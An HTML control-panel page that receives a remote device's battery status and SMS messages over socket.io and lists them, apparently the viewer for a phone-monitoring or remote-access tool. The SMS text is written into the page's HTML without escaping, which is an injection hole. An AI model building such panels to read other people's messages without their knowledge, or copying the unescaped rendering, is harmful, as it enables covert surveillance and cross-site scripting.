<!DOCTYPE html>
<html>
<head>
    <title>Control Panel</title>
    <script src="/socket.io/socket.io.js"></script>
    <style>
        :root {
            --sidebar-bg: #34495e; --main-bg: #f5f5f5; --accent: #1abc9c;
            --blue: #3498db; --purple: #9b59b6; --yellow: #f1c40f;
        }
        body { font-family: 'Segoe UI', sans-serif; background: var(--main-bg); margin: 0; display: flex; }

        /* SIDEBAR */
        .sidebar { width: 250px; background: var(--sidebar-bg); color: #bdc3c7; position: fixed; height: 100vh; }
        .sidebar-header { background: var(--accent); color: white; padding: 20px; font-weight: bold; }
        .nav-item { padding: 15px 20px; cursor: pointer; border-bottom: 1px solid #2c3e50; transition: 0.3s; }
        .nav-item:hover, .nav-item.active { background: #2c3e50; color: white; }

        /* CONTENT */
        .main-content { margin-left: 250px; flex-grow: 1; }
        .top-nav { height: 60px; background: white; display: flex; justify-content: flex-end; align-items: center; padding: 0 30px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        
        /* BATTERY */
        .battery-box { padding: 5px 15px; border-radius: 4px; font-weight: bold; margin-right: 10px; }
        .online { background: #d4efdf; color: #145a32; }
        .offline { background: #fadbd8; color: #7b241c; }
        #charging-icon, #unplugged-icon { font-size: 1.5rem; display: none; }

        /* GRID */
        .view-section { display: none; padding: 30px; }
        .view-section.active { display: block; }
        .grid-layout { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 15px; }
        .dash-card { height: 100px; padding: 20px; color: white; border-radius: 3px; cursor: pointer; display: flex; justify-content: space-between; align-items: center; }
        
        /* SMS LIST */
        .sms-item { background: white; padding: 15px; margin-bottom: 10px; border-left: 5px solid var(--blue); border-radius: 4px; color: #333; }
    </style>
</head>
<body>

    <div class="sidebar">
        <div class="sidebar-header">üè† System Admin</div>
        <div class="nav-item active" onclick="showView('dashboard')">üè† Dashboard</div>
        <div class="nav-item" onclick="showView('sms')">‚úâÔ∏è SMS Logs</div>
        <div class="nav-item">üìû Call Logs</div>
    </div>

    <div class="main-content">
        <div class="top-nav">
            <div id="bat-box" class="battery-box offline"><span id="bat-pct">--</span>%</div>
            <span id="charging-icon" style="color:#f1c40f">‚ö°</span>
            <span id="unplugged-icon" style="color:#27ae60">üîã</span>
        </div>

        <section id="dashboard" class="view-section active">
            <h2>Dashboard</h2>
            <div class="grid-layout">
                <div class="dash-card" style="background:var(--blue)" onclick="showView('sms')">
                    <span>‚úâÔ∏è SMS</span><span id="sms-count" style="font-size: 2rem;">0</span>
                </div>
            </div>
        </section>

        <section id="sms" class="view-section">
            <h2>SMS Messages</h2>
            <div id="sms-container">Connecting to device...</div>
        </section>
    </div>

    <script>
        const socket = io();

        function showView(viewId) {
            document.querySelectorAll('.view-section').forEach(s => s.classList.remove('active'));
            document.getElementById(viewId).classList.add('active');
            if(viewId === 'sms') socket.emit('get-sms-request');
        }

        socket.on('ui-battery', (data) => {
            const pct = (typeof data === 'object') ? data.percent : data;
            const charging = (typeof data === 'object') ? data.charging : false;
            document.getElementById('bat-pct').innerText = pct;
            document.getElementById('bat-box').className = "battery-box online";
            document.getElementById('charging-icon').style.display = charging ? "inline" : "none";
            document.getElementById('unplugged-icon').style.display = charging ? "none" : "inline";
        });

        socket.on('ui-sms-display', (smsArray) => {
            document.getElementById('sms-count').innerText = smsArray.length;
            const container = document.getElementById('sms-container');
            container.innerHTML = smsArray.map(m => `
                <div class="sms-item">
                    <strong>${m.address}</strong><br>${m.body}<br>
                    <small>${new Date(m.date).toLocaleString()}</small>
                </div>
            `).join('');
        });
    </script>
</body>
</html>
